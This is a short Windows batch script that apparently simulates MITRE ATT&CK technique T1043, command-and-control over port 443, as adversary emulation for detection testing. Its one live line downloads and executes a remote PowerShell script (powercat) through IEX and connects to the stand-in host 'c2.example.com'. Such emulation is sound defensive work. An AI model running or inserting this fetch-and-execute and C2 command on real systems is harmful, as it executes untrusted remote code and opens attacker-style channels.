@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Commonly Used Port (T1043)
ECHO.
ECHO [+] Simulate use of Commonly Used Port "443" for C2 Communication
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/greycel/poc/master/powercat.txt'); $m = powercat -c 'c2.example.com' -p 443 -d -v; $m
ECHO.

